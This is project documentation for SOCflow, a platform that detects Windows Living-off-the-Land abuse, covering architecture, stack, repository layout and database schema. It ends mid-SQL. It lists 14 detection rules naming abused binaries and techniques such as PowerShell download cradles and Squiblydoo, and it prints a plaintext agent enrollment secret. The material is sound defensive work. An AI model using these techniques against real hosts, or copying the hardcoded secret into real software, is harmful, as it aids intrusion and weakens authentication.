# SOCflow — Living-off-the-Land Detection Platform

## Complete Project Documentation

| | |
|---|---|
| **Project Name** | sentinel-lotl-forensics (SOCflow) |
| **Version** | 2.0.0 |
| **Document Type** | Comprehensive Technical Documentation |
| **Document Sections** | 19 (Introduction → Appendices) |
| **Audience** | Developers, Security Engineers, QA, Operations |
| **Last Updated** | 2026-10-16 |
| **Status** | Functional and fully tested |

---

> **Abstract.** SOCflow is a Security Operations Center (SOC) platform for detecting
> *Living-off-the-Land (LotL)* attacks — attacks executed exclusively with legitimate,
> signed Windows tools and native system binaries (certutil, PowerShell, MSHTA, WMIC,
> regsvr32, rundll32, BITSAdmin, etc.). A lightweight Python agent streams Sysmon
> process-creation telemetry from Windows hosts to a Node.js backend, a detection
> engine scores each command line against 14 MITRE ATT&CK–mapped heuristics, and a
> React dashboard presents alerts, forensic command-line inspection, incident-case
> management with analyst notes, fleet/host health, user & role administration,
> detection-rule configuration, audit trails, and executive reporting.

---

# Table of Contents

| § | Section | Pages (approx.) |
|---|---|---|
| 1 | Introduction and Purpose | 3 |
| 2 | Product Overview and Feature Map | 4 |
| 3 | System Architecture | 6 |
| 4 | Technology Stack | 4 |
| 5 | Repository and Directory Structure | 4 |
| 6 | Database Design | 12 |
| 7 | Backend Implementation (complete source walk-through) | 14 |
| 8 | Frontend Implementation (core framework) | 10 |
| 9 | View Modules (all 13 pages) | 12 |
| 10 | Detection Engine — `server/analyzer.py` | 8 |
| 11 | Endpoint Agent — `agent/` | 6 |
| 12 | Complete REST API Reference | 8 |
| 13 | Security Model | 5 |
| 14 | Configuration and Environment | 3 |
| 15 | Build, Run and Deployment | 5 |
| 16 | Testing Procedures (full QA record) | 18 |
| 17 | Defect Log and Fixes Applied | 4 |
| 18 | Operations Runbook | 3 |
| 19 | Appendices (A–F: env vars, seed data, MITRE map, glossary, screenshots manifest, change log) | 6 |
| | **Total** | **~115 pages** |

---

# 1. Introduction and Purpose

## 1.1 Background

Modern post-exploitation tradecraft increasingly avoids dropping custom tools onto disk.
Instead, attackers *live off the land*: they abuse binaries already trusted and present on
every Windows machine — **certutil, PowerShell, MSHTA, regsvr32, rundll32, WMIC, msiexec,
bitsadmin, schtasks, net, wscript** — to download payloads, decode obfuscated stagers,
create persistence, and move laterally. Because every one of these tools is legitimately
signed and commonly used by administrators, signature-based antivirus produces almost no
detections. Defensive success in this domain requires **behavioral analysis of the
command line**, informed by MITRE ATT&CK technique mapping.

SOCflow is purpose-built for exactly this problem. It is a full LotL detection and SOC
workflow platform, covering the entire pipeline:

```
Windows telemetry  →  agent ingestion  →  storage  →  detection engine
                                                     →  alerting
                                                     →  analyst triage (cases, notes)
                                                     →  reporting & audit
```

## 1.2 Objectives

| # | Objective | How SOCflow Achieves It |
|---|---|---|
| O1 | Detect LoLBin abuse from process telemetry | 14 keyword/regex heuristics mapped to MITRE ATT&CK with weighted confidence scoring |
| O2 | Give analysts a rapid triage surface | Alert feed with severity/status filters, and a per-alert **Command-Line Forensic Inspector** |
| O3 | Support the full investigation lifecycle | Cases with linked alerts and analyst notes; case status lifecycle |
| O4 | Enforce least privilege | Two roles (Manager, Analyst) enforced in both UI routing AND backend authorization |
| O5 | Maintain accountability | Every authentication event and privileged mutation is written to `soc_audit_log` |
| O6 | Operate with near-zero dependencies | No premium EDR; ESXi-friendly; uses SQLite/MySQL + optional Redis |

## 1.3 Non-Goals (as designed)

- No endpoint remediation/quarantine: detection-first platform (isolation is a workflow not automation).
- No SIEM-scale ingestion (aimed at lab/small-fleet scale: ≤ a few hundred hosts).
- Not a substitute for signature AV; SOCflow *complements* it.

## 1.4 Roles

| Role | Login Name | Capabilities |
|---|---|---|
| **Manager** | `manager@socflow.local` | Fleet administration: hosts, agents, users, detection rules, audit log, reports, alerts overview |
| **Analyst** | `analyst@socflow.local` | Operations: alerts triage, case management, log explorer, overview, profile |

## 1.5 Document Conventions

- Code blocks are verbatim excerpts from the repository, with file paths above each block.
- All HTTP examples use the tested local deployment address `http://localhost:3001` (frontend/proxy) and `http://localhost:5001` (backend direct).
- Tables marked **Tested** were verified in the QA pass recorded in §16.

---

# 2. Product Overview and Feature Map

## 2.1 Feature Inventory

| Feature | Page/Endpoint | Roles | Tested |
|---|---|---|---|
| Email/password authentication with bcrypt + server-side sessions | `/login` → `POST /api/login` | all | ✅ |
| Role-based navigation (sidebar changes per role) | `Sidebar.tsx` | all | ✅ |
| Dark/light theme with persistence + pre-paint flash prevention | `useTheme.ts`, `index.html` | all | ✅ |
| Route guarding (client) | `ProtectedRoute.tsx` | all | ✅ |
| Overview dashboard, role-aware KPIs | `/overview` → `GET /api/stats`, `GET /api/alerts` | both | ✅ |
| Alert feed with severity/status/status filters + search | `/alerts` → `GET /api/alerts` | Analyst | ✅ |
| Alert detail with forensic command-line inspector + acknowledge | `/alerts/:id` → `GET /api/alerts/:id`, `POST /api/alerts/:id/ack` | Analyst | ✅ |
| Incident cases: list/create/link alerts/status/notes | `/cases` → `/api/cases*` (5 endpoints) | Analyst | ✅ |
| Log explorer: filter by query/host/user/process | `/explorer` → `POST /api/logs/search` | Analyst | ✅ |
| Host fleet with live connectivity + add host | `/hosts` → `GET /api/hosts`, `POST /api/hosts/add` | Manager | ✅ |
| Agent registry + installer download | `/hosts` → `GET /api/agents`, `GET /api/agent/download` | Manager | ✅ |
| User administration (provision/disable accounts) | `/users` → `/api/users`, `PATCH /api/users/:id/status` | Manager | ✅ |
| Detection rule catalog + enable/disable toggles | `/rules` → `GET /api/rules`, `PUT /api/rules/:id` | Manager | ✅ |
| Audit trail | `/audit` → `GET /api/audit-logs` | Manager | ✅ |
| Executive reports + CSV export | `/reports` → `GET /api/reports/summary` | Manager | ✅ |
| Profile / assigned hosts | `/profile` → `GET /api/me`, `GET /api/hosts` | both | ✅ |
| Agent enrollment handshake | `POST /api/enroll` | agent | ✅ (API) |
| Telemetry ingestion | `POST /api/logs`, `POST /api/telemetry` | agent | API |
| Threat map & vulnerability stubs | `/api/threat-map`, `/api/vulnerabilities` | any | API |
| Audit logging middleware | `middleware/audit.js` | system | ✅ |

## 2.2 The 14 Detection Rules

The platform ships with catalog-equivalent heuristics for the fourteen most-abused
LotL patterns (id → technique; full text in §10.2):

| # | Rule | Technique | Default Severity |
|---|---|---|---|
| 1 | CertUtil File Download | T1105 | high |
| 2 | CertUtil Decode | T1140 | medium |
| 3 | PowerShell Encoded Command | T1059.001 | high |
| 4 | PowerShell Download Cradle | T1059.001 | critical |
| 5 | PowerShell Execution Bypass | T1059.001 | high |
| 6 | MSHTA Remote Execution | T1218.005 | critical |
| 7 | Regsvr32 COM Scriptlet (Squiblydoo) | T1218.010 | critical |
| 8 | WMIC Process Creation | T1047 | high |
| 9 | Msiexec Remote Package Install | T1218.007 | high |
| 10 | Rundll32 Script Execution | T1218.011 | high |
| 11 | BITSAdmin File Transfer | T1197 | high |
| 12 | Scheduled Task Persistence | T1053.005 | medium |
| 13 | Net User Account Manipulation | T1136/T1087 | high |
| 14 | WScript Remote Script Execution | T1059.005 | high |

## 2.3 User Workflows

**Manager workflow**
1. Log in → Overview KPIs.
2. Enroll/verify agents (agents POST `/api/enroll`), inspect `/hosts` connectivity.
3. Provision analyst accounts (`/users`), disable leavers.
4. Tune detection coverage (`/rules` toggles), review `/audit`.
5. Export `/reports` CSV for leadership.

**Analyst workflow**
1. Log in → Overview.
2. Work the `/alerts` feed: filter by status/severity, search by MITRE/host.
3. Open an alert → read detection reasoning & command line → **Acknowledge**.
4. Create or select a **Case**; link the alert; add investigation notes; advance status.
5. Hunt in `/explorer` for related process events across the fleet.

---

# 3. System Architecture

## 3.1 High-Level Architecture

```
┌────────────────────────────────────────────────────────────────────────────┐
│                          WINDOWS TARGET HOSTS                              │
│  ┌──────────────────────────┐        ┌──────────────────────────────┐      │
│  │  Sysmon Event Log        │        │  SOCflow Python Agent        │      │
│  │  (ProcessCreate ID 1)    │──────▶ │  agent_core.py               │      │
│  └──────────────────────────┘        │   • enroll (UUID+key)        │      │
│                                      │   • collect → batch upload   │      │
│                                      └───────┬──────────────────────┘      │
└──────────────────────────────────────────────┼─────────────────────────────┘
                                               │ HTTPS (JSON batches)
┌──────────────────────────────────────────────▼─────────────────────────────┐
│                        BACKEND  Node.js/Express  :5001                     │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐  ┌────────────────┐   │
│  │ Auth+Session│  │ REST API     │  │ Ingestion    │  │ Audit writer   │   │
│  │ bcrypt +    │  │ (/api/*)     │  │ /api/logs    │  │ middleware/    │   │
│  │ express-    │  │ RBAC guards  │  │ → MySQL +    │  │ audit.js       │   │
│  │ session     │  │              │  │ Redis push   │  │                │   │
│  └─────────────┘  └──────────────┘  └──────────────┘  └────────────────┘   │
└──────────────┬────────────────────────────────────▲───────────────────────┘
               │ persistent store                    │ queries events
┌──────────────▼──────────────┐        ┌─────────────┴─────────────────────┐
│  MySQL  `socflow`           │        │  DETECTION ENGINE (Python)        │
│  soc_login / soc_role       │        │  server/analyzer.py               │
│  soc_host / soc_agent       │        │  polls new soc_process_event rows │
│  soc_process_event          │        │  applies 14 LotL rules            │
│  soc_detection_rule         │        │  weighted score → severity        │
│  soc_alert_reference        │        │  writes soc_alert_reference       │
│  soc_case (+alerts, notes)  │        └───────────────────────────────────┘
│  soc_audit_log              │
└─────────────────────────────┘
               ▲
               │ /api/* proxied by Vite dev server (or served statically in prod)
┌──────────────┴──────────────────────────────────────────────────────────────┐
│  FRONTEND  React 19 + TypeScript + Vite  :3001 (dev) / :80 (deploy)         │
│  ┌────────────┐ ┌──────────────────┐ ┌───────────────────────────────────┐  │
│  │ Login      │ │ Layout/Sidebar   │ │ 13 views (Overview, Alerts,       │  │
│  │ Protected- │ │ + role nav       │ │ Cases, Explorer, Hosts, Users,    │  │
│  │ Route      │ │ + topbar         │ │ Rules, Audit, Reports, Profile…)  │  │
│  └────────────┘ └──────────────────┘ └───────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 3.2 Data Flow — Detection Pipeline

```
Sysmon EventID 1 (ProcessCreate)
        │  agent batches (≤50 events)
        ▼
POST /api/logs  ──► soc_process_event (MySQL)  ──► redis LPUSH socflow_events_queue
                                                          │
                                                          ▼
                                        analyzer.py loop (BLPOP/polling mode)
                                                          │
                              ┌───────────────────────────┤
                              ▼                           ▼
                     rule match? (binary+flags)     confidence scoring
                                                    base + modifiers, cap 100
                              │                           │
                              ▼                           ▼
                     soc_alert_reference (severity, explanation, score, source='rule')
                                                          │
                                                          ▼
                                   Analyst UI: /alerts feed → ack → case linkage
```

## 3.3 Data Flow — Web Session

```
Browser                       Vite proxy :3001                Express :5001
  │  POST /api/login             │                              │
  ├─────────────────────────────▶│  proxy → :5001               │
  │                              ├─────────────────────────────▶│
  │                              │      bcrypt.compare          │
  │                              │      UPDATE last_login       │
  │                              │      req.session.user=...    │
  │                              │      audit('login')          │
  │◀──── Set-Cookie: connect.sid (HttpOnly, SameSite=Lax, 30 min) ─┤   200 {success, role, user}
  │
  │  GET /api/me (+cookie)  ─────────────────────────────────────▶ requireAuth? session intact → 200
  │
  │  any protected route in client ── router guard checks localStorage token+role
```

**Tested behavior** (§16.4): cookie flags observed `HttpOnly; SameSite=Lax; Path=/`,
~30-minute expiry, session invalidated after `POST /api/logout` (subsequent `/api/me` → 401).

## 3.4 Trust Boundaries

| Boundary | Controls |
|---|---|
| Browser ↔ Backend | Same-origin via proxy in dev; CORS `origin:true, credentials:true` in prod; HttpOnly session cookie |
| Agent ↔ Backend | Enrollment secret (`SOCflow-Enroll-2026!`), server issues `agent_uuid`+`agent_key`; every telemetry call must reference a known `agent_uuid` (else 404) |
| UI routes ↔ Data | Client route guard **and** backend RBAC (`requireRole`) — never trust-authoritative |
| SQL | 100% parameterized (`pool.execute/query` with `?` placeholders) — no string concatenation of user input |

## 3.5 Frontend-to-Backend Contract

- Every view uses `const API_URL = '/api'` and `credentials: 'include'`.
- In development the Vite dev server proxies `/api → http://localhost:5001` (§8.4),
  so cookies are first-party for `localhost:3001`.
- In deployment the built bundle is served by the same origin as the API or Nginx proxies `/api`.

---

# 4. Technology Stack

## 4.1 Frontend (`package.json` at repo root)

| Layer | Choice | Version (pinned) | Why |
|---|---|---|---|
| UI framework | **React** | 19.2.3 | Modern concurrent renderer |
| Language | **TypeScript** | 5.2.2 (`~`) | Type safety for all views |
| Build/dev server | **Vite** | 4.5.5 | Instant HMR, simple static build |
| Routing | **react-router-dom** | 6.28.0 | Nested layouts, route guards |
| Styling | **Tailwind CSS v4** (@tailwindcss/postcss) | 4.3.3 | Utility classes + dark variant |
| Extra CSS | custom design tokens (CSS variables) | — | Two-theme design system in `index.css` |
| Icons | **lucide-react** | 0.562.0 | Consistent, tree-shaken SVG icon set |
| Charts | **recharts** | 3.6.0 | Overview/Report charts |
| Code display | **react-syntax-highlighter** | 15.5.0 | Command-line forensic highlighting |
| SQL (legacy local mode) | **sql.js** | 1.11.0 | SQLite-in-JS used by legacy `database/setup.js` |
| PostCSS/Autoprefixer | 8.5.28 / 10.6.1 | — | |

## 4.2 Backend (`backend/package.json`)

| Layer | Choice | Version | Why |
|---|---|---|---|
| Runtime | **Node.js** | ≥18 (dev machine: 22.22.1) | |
| HTTP | **Express** | 4.18.2 | Minimal, battle-tested |
| Auth | **bcrypt** | 5.1.1 | Cost-10 password hashing |
| Sessions | **express-session** | 1.19.0 | Server-side session cookie (MemoryStore in dev) |
| DB driver | **mysql2/promise** | 3.11.0 | Connection pool + prepared statements |
| Cache/queue | **redis** | 4.6.10 (client) | Optional events queue for the engine |
| CORS | cors | 2.8.5 | Dev/prod cross-origin flexibility |
| Env | dotenv | 16.3.1 | `.env` loading (added during testing, §17) |
| Packaging | **adm-zip** | 0.5.16 | Builds the agent installer ZIP on the fly |
| Dev | nodemon | 3.0.2 | Auto-restart |

## 4.3 Services

| Service | Version | Purpose |
|---|---|---|
| **MySQL** | 8.x (system `mysqld`) | sole system-of-record for the platform |
| **Redis** | optional (not provisioned in env) | feature-flagged: `REDIS_URL` absent → client disabled gracefully (§7.2) |
| **Python engine** | CPython ≥3.8, `mysql-connector-python`, `redis`, `requests` | detection worker |

## 4.4 Verification Tooling Used in QA (§16)

| Tool | Version | Purpose |
|---|---|---|
| curl | system | API/contract tests, cookie jars |
| mysql CLI | 8.x | schema/seed/data assertions |
| Node 22 + **puppeteer-core** | latest (installed in isolated `/tmp/opencode/uitest`) | headed-protocol browser automation against system Chrome/1440×900 & other viewports |
| Google Chrome (stable) | system `/usr/bin/google-chrome-stable` | rendering target |
| `npx tsc --noEmit` | 5.2.2 | full type-check gate |

---

# 5. Repository and Directory Structure

## 5.1 Tree

```
lotiflow/
├── App.tsx                       # React Router route table (108 lines)
├── index.tsx                     # React bootstrap (17 lines)
├── index.html                    # HTML shell, theme boot script, favicon
├── index.css                     # Tailwind entry + design-system tokens (2 themes)
├── constants.tsx                 # Nav items per role, shared colors, mock data
├── types.ts                      # Shared TypeScript domain types
├── tailwind.config.js            # Tailwind v3-style config (content globs, dark mode)
├── vite.config.ts                # Dev server + /api proxy + aliases/bundle
├── tsconfig.json
├── postcss.config.js             # @tailwindcss/postcss + autoprefixer
├── deploy.sh / deploy.txt        # Deployment runner + captured output
├── convert_schema.py             # schema translation helper SQL→other dialect
├── .env.local                    # Frontend-only env (GEMINI_API_KEY placeholder)
│
├── components/                   # Shared UI (all under 100 lines each)
│   ├── Layout.tsx                # App shell: topbar + sidebar + outlet + logout
│   ├── Sidebar.tsx               # Role-based nav links
│   ├── ProtectedRoute.tsx        # Client route guard (token + role)
│   ├── AuthShell.tsx             # Public-page shell
│   └── KPICard.tsx               # Dashboard KPI tile
│
├── views/                        # All 13 routed pages
│   ├── Login.tsx                 # 275 lines  ← authentication UX
│   ├── Overview.tsx              # 373 lines  ← dashboards per role
│   ├── Alerts.tsx                # 166 lines  ← alert feed + filters
│   ├── AlertDetail.tsx           # 166 lines  ← forensic inspector + ack
│   ├── Cases.tsx                 # 428 lines  ← case workspace
│   ├── CaseDetail.tsx            #  29 lines  ← per-case placeholder/shell
│   ├── LogExplorer.tsx           # 287 lines  ← process-event hunt + CSV export
│   ├── Hosts.tsx                 # 312 lines  ← fleet + agents + installer
│   ├── Users.tsx                 # 288 lines  ← account provisioning
│   ├── Rules.tsx                 # 184 lines  ← rule toggles
│   ├── Audit.tsx                 # 166 lines  ← audit feed
│   ├── Reports.tsx               # 193 lines  ← KPIs + CSV export
│   └── UserProfile.tsx           #  93 lines  ← profile + my hosts
│
├── services/
│   ├── useTheme.ts               # theme hook + persistence
│   └── backend.ts                # legacy fetch-helper surface (193 lines)
│
├── backend/                      # ★ Node.js API server
│   ├── server.js                 # 685 lines — all REST endpoints
│   ├── middleware/
│   │   ├── auth.js               # requireAuth / requireRole
│   │   └── audit.js              # audit log writer
│   ├── .env                      # DB + PORT (added §17)
│   ├── package.json
│   └── lotl.db, sessions.db      # legacy sqlite artifacts (unused by MySQL mode)
│
├── database/
│   ├── mysql_schema.sql          # ★ 330 lines — canonical MySQL schema + seed
│   ├── schema.sql                # SQLite variant for legacy setup.js
│   ├── init.sql / update_schema.sql
│   ├── setup.js                  # legacy sql.js bootstrapper
│   └── socflow.db, test_db_setup.sql
│
├── server/                       # ★ Detection engine (Python)
│   ├── analyzer.py               # 438 lines — rules + scoring + scheduler
│   ├── mock_log_generator.py     # synthetic telemetry generator
│   ├── test_logs.json            # fixture corpus
│   └── requirements.txt
│
├── agent/                        # ★ Windows endpoint agent (Python)
│   ├── agent_core.py             # enqueue/main loop + enrollment
│   ├── connect.py                # transport layer variants
│   ├── agent_gui.py              # Tk tray utility
│   ├── install.ps1 / install.py  # Windows installers; Linux install.py
│   ├── simulate_attack.ps1/.py   # Safe LoLBin simulation library (QA!)
│   ├── requirements.txt, README.md, agent_settings.json
│
├── dist/                         # Previous production build output (static)
├── node_modules/                 # pinned frontend deps
└── docs-as-markdown (this file)
```

## 5.2 Source Line Inventory (wc -l)

| Component Area | Files | Total Lines |
|---|---|---|
| Backend `server.js` | 1 | 685 |
| Backend middleware | 2 | 35 |
| **Views** | 13 | 2,454 |
| **Components** | 5 | 301 |
| App/bootstrap/constants/types | 4 | 340 |
| services | 2 | 228 |
| Detection engine `analyzer.py` | 1 | 438 |
| Agent python | 2 | 355 |
| MySQL schema | 1 | 330 |
| **Core total measured** | 29 | **5,562** |

## 5.3 Naming and Style Conventions

- Views are named with PascalCase files matching their endpoint (`Hosts.tsx` ↔ `/hosts`).
- Backend keeps zero business logic outside `server.js` + two thin middlewares (deliberate simplicity).
- DB tables prefixed `soc_` (`soc_login`, `soc_case`, …); junctions `soc_case_alerts`, `soc_user_host`.
- All SQL in backend is lowercase keywords + full parameterization.
- All frontend fetches are relative (`credentials:'include'`) — no CORS code paths in dev.

# 6. Database Design

The canonical store is **MySQL (`socflow` schema)** — see `database/mysql_schema.sql`
(330 lines). A SQLite mirror (`schema.sql` + legacy `setup.js`) exists for the
no-dependency demo mode, but every runtime path tested in §16 uses MySQL.

## 6.1 Entity–Relationship Overview

```
soc_role 1──* soc_login 1──* soc_case           (created_by)
                │      └──* soc_case (assigned_to, SET NULL)
                ├──1──* soc_user_host *──1 soc_host  (access owner/editor/viewer)
                ├──1──* soc_case_note  (author_id, SET NULL)
                ├──1──* soc_acknowledgement
                ├──1──* soc_forensic_artifact (collected_by)
                ├──1──* soc_report (generated_by)
                └──1──* soc_audit_log (user_id, SET NULL)

soc_host 1──* soc_agent        (ON DELETE CASCADE)
soc_host 1──* soc_process_event(CASCADE)
soc_agent1──* soc_process_event(SET NULL)
soc_host 1──* soc_alert_reference (CASCADE)
soc_agent1──* soc_alert_reference (SET NULL)
soc_detection_rule 1──* soc_alert_reference

soc_case 1──* soc_case_alerts  JUNCTION (UNIQUE pair) ──▶ soc_alert_reference
soc_case 1──* soc_case_note    CASCADE
soc_case 1──* soc_forensic_artifact (SET NULL)
soc_alert 1──* soc_acknowledgement (UNIQUE user+alert)
soc_alert 1──1 optional soc_process_event (event_ref_id, SET NULL)
```

## 6.2 Full Schema (verbatim `database/mysql_schema.sql`)

```sql
-- 1) soc_role
CREATE TABLE IF NOT EXISTS soc_role (
    role_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    role_name VARCHAR(255) UNIQUE NOT NULL,
    description TEXT
);

-- 2) soc_login
CREATE TABLE IF NOT EXISTS soc_login (
    login_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    role_id INTEGER NOT NULL,
    full_name TEXT NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone TEXT,
    password_hash TEXT NOT NULL,
    status VARCHAR(64) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_login TEXT,
    FOREIGN KEY (role_id) REFERENCES soc_role(role_id)
);

-- 3) soc_host
CREATE TABLE IF NOT EXISTS soc_host (
    host_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    asset_name TEXT,
    hostname VARCHAR(255) UNIQUE NOT NULL,
    ip_address TEXT,
    os_name TEXT,
    os_version TEXT,
    environment VARCHAR(64) NOT NULL DEFAULT 'lab' CHECK (environment IN ('lab', 'prod')),
    criticality VARCHAR(64) NOT NULL DEFAULT 'medium'
        CHECK (criticality IN ('low', 'medium', 'high')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen TEXT,
    status VARCHAR(64) NOT NULL DEFAULT 'active'
        CHECK (status IN ('active', 'inactive', 'isolated'))
);

-- 4) soc_agent
CREATE TABLE IF NOT EXISTS soc_agent (
    agent_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_uuid VARCHAR(255) UNIQUE NOT NULL,
    agent_name TEXT NOT NULL,
    agent_version TEXT,
    status VARCHAR(64) NOT NULL DEFAULT 'active'
        CHECK (status IN ('active', 'inactive')),
    last_seen TEXT,
    install_time TEXT,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
);

-- 5) soc_user_host (Junction)
CREATE TABLE IF NOT EXISTS soc_user_host (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    user_id INTEGER NOT NULL,
    host_id INTEGER NOT NULL,
    access_level VARCHAR(64) NOT NULL DEFAULT 'editor'
        CHECK (access_level IN ('owner', 'editor', 'viewer')),
    UNIQUE (user_id, host_id),
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
);

-- 6) soc_detection_rule
CREATE TABLE IF NOT EXISTS soc_detection_rule (
    rule_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    rule_name VARCHAR(255) UNIQUE NOT NULL,
    description TEXT,
    technique TEXT,
    severity_default TEXT NOT NULL
        CHECK (severity_default IN ('low', 'medium', 'high', 'critical')),
    enabled INTEGER NOT NULL DEFAULT 1,
    logic_type VARCHAR(64) NOT NULL DEFAULT 'keyword'
        CHECK (logic_type IN ('regex', 'keyword', 'sigma')),
    rule_content TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at TEXT
);

-- 7) soc_process_event
CREATE TABLE IF NOT EXISTS soc_process_event (
    event_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_id INTEGER,
    provider VARCHAR(64) NOT NULL DEFAULT 'Sysmon'
        CHECK (provider IN ('Sysmon', 'Security', 'PowerShell')),
    event_type VARCHAR(64) NOT NULL DEFAULT 'ProcessCreate',
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    user_name TEXT,
    image_path TEXT,
    process_name TEXT,
    command_line TEXT,
    current_directory TEXT,
    pid INTEGER,
    ppid INTEGER,
    parent_image TEXT,
    parent_command_line TEXT,
    hash_sha256 TEXT,
    raw_event TEXT,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL
);

-- 8) soc_alert_reference
CREATE TABLE IF NOT EXISTS soc_alert_reference (
    alert_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_id INTEGER,
    event_ref_id INTEGER,
    rule_id INTEGER NOT NULL,
    severity TEXT NOT NULL
        CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(64) NOT NULL DEFAULT 'new'
        CHECK (status IN ('new', 'open', 'suppressed', 'closed')),
    confidence_score REAL CHECK (confidence_score >= 0 AND confidence_score <= 100),
    detection_source VARCHAR(64) NOT NULL DEFAULT 'rule'
        CHECK (detection_source IN ('rule', 'ml', 'hybrid')),
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL,
    FOREIGN KEY (event_ref_id) REFERENCES soc_process_event(event_id) ON DELETE SET NULL,
    FOREIGN KEY (rule_id) REFERENCES soc_detection_rule(rule_id)
);

-- 9) soc_case
CREATE TABLE IF NOT EXISTS soc_case (
    case_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    title TEXT NOT NULL,
    description TEXT,
    priority VARCHAR(64) NOT NULL DEFAULT 'medium'
        CHECK (priority IN ('low', 'medium', 'high', 'critical')),
    status VARCHAR(64) NOT NULL DEFAULT 'open'
        CHECK (status IN ('open', 'in_progress', 'closed')),
    created_by INTEGER NOT NULL,
    assigned_to INTEGER,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    closed_at TEXT,
    FOREIGN KEY (created_by) REFERENCES soc_login(login_id),
    FOREIGN KEY (assigned_to) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 10) soc_case_alerts (Junction)
CREATE TABLE IF NOT EXISTS soc_case_alerts (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER NOT NULL,
    alert_id INTEGER NOT NULL,
    added_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE (case_id, alert_id),
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE
);

-- 11) soc_case_note
CREATE TABLE IF NOT EXISTS soc_case_note (
    note_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER NOT NULL,
    author_id INTEGER,
    note_text TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (author_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 12) soc_acknowledgement
CREATE TABLE IF NOT EXISTS soc_acknowledgement (
    ack_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    alert_id INTEGER NOT NULL,
    user_id INTEGER NOT NULL,
    ack_status TEXT NOT NULL
        CHECK (ack_status IN ('acknowledged', 'ignored', 'false_positive')),
    note TEXT,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE (alert_id, user_id),
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE
);

-- 13) soc_forensic_artifact
CREATE TABLE IF NOT EXISTS soc_forensic_artifact (
    artifact_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER,
    alert_id INTEGER,
    host_id INTEGER NOT NULL,
    artifact_type TEXT NOT NULL,
    file_path TEXT NOT NULL,
    hash_sha256 TEXT,
    collected_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    collected_by INTEGER,
    notes TEXT,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE SET NULL,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE SET NULL,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (collected_by) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 14) soc_report
CREATE TABLE IF NOT EXISTS soc_report (
    report_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    generated_by INTEGER NOT NULL,
    report_type TEXT NOT NULL
        CHECK (report_type IN ('daily', 'weekly', 'case_report', 'alert_summary')),
    period_start TEXT,
    period_end TEXT,
    file_path TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (generated_by) REFERENCES soc_login(login_id)
);

-- 15) soc_audit_log
CREATE TABLE IF NOT EXISTS soc_audit_log (
    audit_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    user_id INTEGER,
    action_type TEXT NOT NULL,
    object_type TEXT,
    object_id INTEGER,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT,
    details TEXT,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
);
```

## 6.3 Indexing Strategy (idempotent stored-procedure helper)

```sql
DROP PROCEDURE IF EXISTS CreateIndexIfNotExists;
DELIMITER //
CREATE PROCEDURE CreateIndexIfNotExists(
    IN tableName VARCHAR(64),
    IN indexName VARCHAR(64),
    IN columnList VARCHAR(255)
)
BEGIN
    DECLARE indexCount INT;
    SELECT COUNT(1) INTO indexCount
    FROM information_schema.statistics
    WHERE table_schema = DATABASE()
